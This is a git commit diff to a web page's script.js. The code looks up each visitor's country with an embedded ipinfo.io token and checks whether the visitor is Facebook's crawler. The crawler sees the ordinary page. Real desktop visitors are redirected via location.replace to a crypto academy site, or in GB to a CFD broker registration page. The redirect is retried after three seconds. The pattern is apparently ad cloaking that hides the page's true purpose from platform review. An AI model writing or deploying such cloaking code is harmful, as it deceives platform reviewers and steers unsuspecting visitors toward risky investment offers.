a31f1a4a96a2bb1348a7195ce2f6c90c4e846ddc
vautrinF <131580804+vautrinF@users.noreply.github.com>
2023-04-23 11:36:07 +0300

    Update script.js

--- script.js
+++ script.js
@@ -3,15 +3,28 @@ function isMobileDevice() {
 }
 
 if (!isMobileDevice()) {
-  fetch('https://ipinfo.io/json?token=0784c654f65d07')
-    .then(response => response.json())
-    .then(data => {
-      const isFacebookBot = navigator.userAgent.includes('facebookexternalhit');
-      if (!isFacebookBot && data.country !== 'GB') {
-        document.querySelector('.blue-page').style.display = 'none';
-        window.location.href = "https://www.cryptoacademie.net/";
-      } else if (data.country === 'GB') {
-        window.location.href = "https://cfd.fortuna-invest.com/register";
-      }
-    });
+  let isRedirecting = false;
+  
+  const checkCountryAndRedirect = () => {
+    if (isRedirecting) return;
+    isRedirecting = true;
+
+    fetch('https://ipinfo.io/json?token=0784c654f65d07')
+      .then(response => response.json())
+      .then(data => {
+        const isFacebookBot = navigator.userAgent.includes('facebookexternalhit');
+        if (!isFacebookBot && data.country !== 'GB') {
+          document.querySelector('.blue-page').style.display = 'none';
+          window.location.replace("https://www.cryptoacademie.net/");
+        } else if (data.country === 'GB') {
+          window.location.replace("https://cfd.fortuna-invest.com/register");
+        }
+      });
+  }
+  
+  checkCountryAndRedirect();
+  
+  setTimeout(() => {
+    checkCountryAndRedirect();
+  }, 3000);
 }
